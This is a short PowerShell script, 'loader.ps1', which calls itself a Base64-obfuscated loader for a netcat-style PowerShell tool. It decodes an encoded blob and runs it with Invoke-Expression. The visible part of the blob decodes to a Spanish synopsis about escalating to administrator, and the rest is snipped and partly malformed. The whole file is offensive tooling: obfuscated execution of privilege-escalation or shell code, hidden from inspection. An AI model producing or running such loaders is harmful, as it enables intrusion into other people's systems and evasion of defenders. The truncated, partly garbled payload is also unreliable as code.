# loader.ps1 — Base64-obfuscated loader for nc_ps.ps1

$e = @"
PAAjAAoALgBTAFkATgBPAFAAUwBJAFMACgAgACAARQBzAGMAYQBsAGEAIABhACAAYQBkAG0AaQBuAGkAcwB0AHIAYQBkAG8AcgAgACIAQndsbGxhQ1k5UDlFSzRRaF
... (snip: total ~3884 chars) ...
NwAkACkAKwAiACcAKQAiACkAKQAiAAoA
"@

IEX([System.Text.Encoding]::Unicode.GetString(
    [System.Convert]::FromBase64String($e)
))